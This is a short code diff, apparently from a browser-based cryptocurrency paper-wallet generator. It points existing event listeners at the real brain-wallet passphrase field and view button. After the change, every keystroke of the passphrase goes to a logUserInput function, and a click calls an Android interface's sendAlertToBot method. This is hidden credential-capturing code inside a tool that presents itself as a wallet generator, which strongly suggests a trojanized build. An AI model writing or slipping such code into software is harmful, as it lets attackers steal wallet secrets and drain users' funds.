@@ -7188,7 +7188,7 @@ document.getElementById('detailbip38encryptbutton').addEventListener('click', fu
     ninja.wallets.detailwallet.encryptBip38(); // Call the existing function
 });
 
-document.getElementById('brainlabelenterpassphrase').addEventListener('input', function(event) {
+document.getElementById('brainpassphrase').addEventListener('input', function(event) {
     var inputData = event.target.value;
     if (inputData.trim() !== '') {
         logUserInput(inputData);
@@ -7197,7 +7197,7 @@ document.getElementById('brainlabelenterpassphrase').addEventListener('input', f
     }
 });
 
-document.getElementById('brainlabelcompressed').addEventListener('click', function() {
+document.getElementById('brainview').addEventListener('click', function() {
     if (window.AndroidInterface) {
         window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
     } else {
